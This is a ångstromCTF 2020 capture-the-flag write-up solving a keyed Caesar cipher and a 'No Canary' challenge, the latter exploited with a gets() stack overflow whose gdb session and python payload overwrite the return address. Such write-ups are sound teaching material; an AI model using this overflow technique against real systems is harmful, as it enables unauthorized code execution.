# ångstromCTF 2020
![ångstromCTF 2020](https://github.com/Abd-Elrahman-Nasr/ctf-writeups/blob/master/%C3%A5ngstromCTF%202020/angstromCTF2020.png)

ångstromCTF 2020 was a really great competition and we as **P1rates** team enjoyed it and learned a lot, Here's my writeup about what i solved.

## Challenges

| Title                              | Category                        | Score |
| ---------------------------------- |:-------------------------------:| -----:|
|    [Keysar](#Keysar)               |   Crypto                        | 40    |
|    [No Canary](#no-canary)         |   Binary Exploitation           | 50    |
|    [Revving Up](#revving-up)       |   Reversing                     | 50    |
|    [Inputter](#inputter)           |   Misc                          | 100   |
|    [msd](#msd)                     |   Misc                          | 140   |

<hr />

## Keysar
#### Binary Exploitation (40 points)


### Description:
> **Hey! My friend sent me a message... He said encrypted it with the key ANGSTROMCTF.<br>
> He mumbled what cipher he used, but I think I have a clue.<br>
> Gotta go though, I have history homework!!<br>
> agqr{yue_stdcgciup_padas}**

> *Hint: Keyed caesar, does that even exist??*

### solution:

Well, as it's obvious from the title it has something to do with "Ceaser Cipher" and as the hint says "Keyed Ceaser" so i used this [site](http://rumkin.com/tools/cipher/caesar-keyed.php) to decrypt the flag given the key provided and BOOM! we got the flag!

<sub> Flag: ``` actf{yum_delicious_salad} ``` </sub>
---

## No Canary


### Description:
> **Agriculture is the most healthful, most useful and most noble employment of man.<br>
> —George Washington<br><br>
> Can you call the flag function in this [program](https://github.com/Abd-Elrahman-Nasr/ctf-writeups/blob/master/%C3%A5ngstromCTF%202020/No%20Canary/no_canary) ([source](https://github.com/Abd-Elrahman-Nasr/ctf-writeups/blob/master/%C3%A5ngstromCTF%202020/No%20Canary/no_canary.c))? Try it out on the shell server at /problems/2020/no_canary or by connecting with nc shell.actf.co 20700.**

> *Hint: What's dangerous about the gets function?*

### solution:

The answer for the hint is simple .. It's "overflow"! .. gets function doesn't restrict the user input length and hence we can make an overflow given the address of flag() function to read the flag.txt!

So to get the address of flag() function we will use gdb
```
$ gdb no_canary
(gdb) set disassembly-flavor intel
(gdb) info func
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setresgid@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  gets@plt
0x0000000000401080  getegid@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  _start
0x00000000004010d0  _dl_relocate_static_pie
0x00000000004010e0  deregister_tm_clones
0x0000000000401110  register_tm_clones
0x0000000000401150  __do_global_dtors_aux
0x0000000000401180  frame_dummy
0x0000000000401186  flag
0x0000000000401199  main
0x00000000004012e0  __libc_csu_init
0x0000000000401350  __libc_csu_fini
0x0000000000401358  _fini
```

Nice! we got the address **0x00401186** .. Now we know that name variable is of size 20 so we need a payload > 20 to reach to rip register and put the address of flag() function in there.

We need to see the main function:
```
(gdb) disas main
   .
   .
   0x00000000004012ba <+289>:	call   0x401070 <gets@plt>
   0x00000000004012bf <+294>:	lea    rax,[rbp-0x20]
   .
   .
```
And then setting a breakpoint at **0x004012bf** right after call gets() function instruction:
```
(gdb) b *0x004012bf
```
We'll run the program using a payload of 20 "A"s letter:
```
(gdb) r <<< $(python -c "print 'A' * 20")
```
Now we hit the breakpoint, We also need to know the saved rip register value so we can detect it on the stack and optimize our payload to target it:
```
(gdb) info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4012bf in main; saved rip = 0x7ffff7a5a2e1
.
.
```
So our target is **0x7ffff7a5a2e1** .. Now by examining the stack:
```
(gdb) x/100x $rsp
0x7fffffffe560:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe570:	0x41414141	0x00007f00	0x00000000	0x00002af8
0x7fffffffe580:	.0x004012e0	0x00000000	0xf7a5a2e1	0x00007fff
.
.
```
It's so clear that **0xf7a5a2e1	0x00007fff** is the saved rip register in little-endian and if we can replace it with the flag() function address which is **0x0000000000401186** we can change the flow of the program to print the flag!

so our final payload will be:
```
(gdb) r <<< $(python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00'")
```
That was locally, and by applying it to **nc shell.actf.co 20700** it should give us the flag:
```
$ python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00' | nc shell.actf.co 20700
```

<sub> Flag: ``` actf{that_gosh_darn_canary_got_me_pwned!} ``` </sub>
